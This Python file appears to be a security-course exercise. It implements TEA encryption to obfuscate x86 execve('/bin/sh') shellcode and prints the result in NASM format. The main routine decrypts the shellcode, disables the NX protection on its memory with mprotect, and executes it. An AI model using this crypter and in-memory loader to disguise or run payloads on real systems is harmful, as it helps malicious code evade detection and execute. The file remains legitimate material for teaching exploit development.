# Paolo Stagno aka [VoidSec](https://voidsec.com)
# SLAE-1511
#Pyhton Implementation of the Tiny Encryption Algorithm (TEA)
#https://en.wikipedia.org/wiki/Tiny_Encryption_Algorithm
#Tested on both Python 3.6.9 (ubuntu) and 3.8.2 (win 10)

import ctypes
import string
import random
import itertools
import math


def crypt(plaintext, key):
    """
    Encrypts a message using a 16-character key.

    :param plaintext:
        Plaintext message to encrypt.

    :param key:
        The encryption key used to encrypt the plaintext message.

    :return:
        Encrypted message.
    """
    v = _str2vec(plaintext)
    k = _str2vec(key)
    
    bytearray = b"".join(_vec2str(_crypt(chunk, k))for chunk in _chunks(v, 2))

    return bytearray


def _str2vec(string, l=4):
    """
    The string is split into chunks of length l and each chunk is encoded as 2 elements in the return value.
    
    :param string:
        A binary string to encode.
    :param l:
        An optional length value of chunks.
    :return:
        A vector containing ceil(n / l) elements where n is string's length.
    """
    n = len(string)#24
    # Split the string into chunks
    num_chunks = math.ceil(n / l) #6
    chunks = [string[l * i:l * (i + 1)] for i in range(num_chunks)] # chunk=key[4*0:4*(0+1)] "grep" chars four by four 0-11
    #print("CHUNKS:")
    #print(chunks) #will result in 6 chunks
    return [sum([chars << 8 * j for j, chars in enumerate(chunk)]) for chunk in chunks]#byte shift to trasform in c_uint32


def _vec2str(vector, l=4):
    """
    The string is composed by chunks of size l for every two elements in the vector.
    
    :param vector:
        An even-length vector.
    :param l:
        The length of the chunks to compose the returned string. This should match the value for l used by _str2vec.
        If the value used is smaller, characters will be lost.
    :return:
    """
    return bytes((element >> 8 * i) & 0xff for element in vector for i in range(l))


def _crypt(v, k):
    """
    TEA crypt algorithm. Crypt a length-2 vector using a length-4 vector key.

    :param v:
        A vector representing the information to be crypted. *Must* have a length of 2.
    :param k:
        A vector representing the encryption key. *Must* have a length of 4.
    :return:
        A length-2 vector representing the encrypted information v.
    """
    y, z = [ctypes.c_uint32(x) for x in v]
    sum = ctypes.c_uint32(0)
    delta = 0x9E3779B9

    for n in range(32, 0, -1):
        sum.value += delta
        y.value += (z.value << 4) + k[0] ^ z.value + sum.value ^ (z.value >> 5) + k[1]
        z.value += (y.value << 4) + k[2] ^ y.value + sum.value ^ (y.value >> 5) + k[3]

    return [y.value, z.value]


def _chunks(iterable, n):
    """
    Iterates through an iterable chunks of size n.

    :param iterable:
        Any iterable. Must have a length which is a multiple of n, or the last element will not contain n elements.
    :param n:
        The size of the chunks.
    :return:
        A generator that yields elements in chunks of size n.
    """
    it = iter(iterable)
    while True:
        chunk = tuple(itertools.islice(it, n))
        if not chunk:
            return
        yield chunk

        
def decrypt(ciphertext, key):
    """
    Decrypts a message using a 16-character key.

    :param ciphertext:
        The encrypted message.

    :param key:
        The encryption key used to encrypt the plaintext message.

    :return:
        Decrypted message.
    """
    if not ciphertext:
        return ""

    k = _str2vec(key)
    v = _str2vec(ciphertext)
    
    return b"".join(_vec2str(_decrypt(chunk, k)) for chunk in _chunks(v, 2))


def _decrypt(v, k):
    """
    TEA decrypt algorithm. Decrypt a length-2 vector using a length-4 vector key.

    :param v:
        A vector representing the information to be decrypted. *Must* have a length of 2.
    :param k:
        A vector representing the encryption key. *Must* have a length of 4.
    :return:
        The original message.
    """
    y, z = [ctypes.c_uint32(x) for x in v]
    sum = ctypes.c_uint32(0xC6EF3720)
    delta = 0x9E3779B9

    for n in range(32, 0, -1):
        z.value -= (y.value << 4) + k[2] ^ y.value + sum.value ^ (y.value >> 5) + k[3]
        y.value -= (z.value << 4) + k[0] ^ z.value + sum.value ^ (z.value >> 5) + k[1]
        sum.value -= delta

    return [y.value, z.value]


def key_generator(size=16, chars=string.ascii_uppercase + string.ascii_lowercase + string.digits):
    """
    Generate a 16-character pseudo random key used to encrypt the plaintext message. Charset is a-z, A-Z, 0-9 

    :param size:
        Optional key size. Default for TEA encryption is 16.

    :return:
        A n-size pseudo random key.
    """
    key=str("".join(random.choice(chars) for _ in range(size))).encode()
    key=bytearray(key)
    return key


def nasm_gen(string):
    """
    Generate a nasm formatted shellcode.

    :param size:
        Hex encoded string.

    :return:
        Nasm formatted string.
    """
    string="0x"+"0x".join(a+b for a,b in zip(string[::2], string[1::2]))
    string=", ".join(string[i:i+4] for i in range(0, len(string), 4))
    return string


if __name__ == "__main__":
    key=key_generator()
    print("key: {}".format(key))
    hex_key=key.hex()
    print("hex key: {}".format(hex_key))
    print("NASM ready key: {}".format(nasm_gen(hex_key)))
    print("-------------------------------")
    shellcode=bytearray(b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80")
    print("shellcode: {}".format(shellcode))
    shellcode_len=len(shellcode)
    print("original shellcode length: {}".format(shellcode_len))
    if (shellcode_len%2)!=0:
        #must be padded at an even number
        print("[!] shellcode length is not even, it will be padded to an even number")
        shellcode.append(0x90)
    multiple=(len(shellcode)%4)    
    if (multiple!=0):
        #must be padded to a multiple of 4
        print("[!] shellcode length is not multiple of 4, it will be further padded")
        if(multiple==1):
            shellcode.append(0x90)
            shellcode.append(0x90)
            shellcode.append(0x90)
        elif(multiple==2):
            shellcode.append(0x90)
            shellcode.append(0x90)
        elif(multiple==3):
            shellcode.append(0x90)
    if((len(shellcode)/4)%2!=0):
        #if is an odd number we must "block" pad it, otherwise will break on TEA encrypt as every chunk is taken 2 by 2
        print("[!] shellcode length must be 'block' padded in order to work with TEA")
        shellcode.append(0x90)
        shellcode.append(0x90)
        shellcode.append(0x90)
        shellcode.append(0x90)
    hex_shellcode=shellcode.hex()
    print("hex shellcode: {}".format(hex_shellcode))
    shellcode_len=int(len(hex_shellcode)/2)
    print("new shellcode length: {}".format(shellcode_len))
    print("-------------------------------")
    print("Encrypted shellcode:")
    enc = crypt(shellcode, key)
    print(enc)
    hex_enc=enc.hex()
    print("crypted shellcode in hex: {}".format(hex_enc))
    print("NASM ready shellcode: {}".format(nasm_gen(hex_enc)))
    print("-------------------------------")
    print("Decrypted shellcode:")
    dec=decrypt(enc, key)
    print(dec)
    print("decrypted shellcode in hex: {}".format(dec.hex()))
    print("Executing the shellcode...")
    shellcode=ctypes.create_string_buffer(dec)
    function = ctypes.cast(shellcode, ctypes.CFUNCTYPE(None))
    addr = ctypes.cast(function, ctypes.c_void_p).value
    libc = ctypes.CDLL('libc.so.6')
    pagesize = libc.getpagesize()
    addr_page = (addr // pagesize) * pagesize
    for page_start in range(addr_page, addr+len(dec), pagesize):
        #The NX Bit will prevents our data being executed, to get around it, we will call mprotect
        assert libc.mprotect(page_start, pagesize, 0x7) == 0
    function()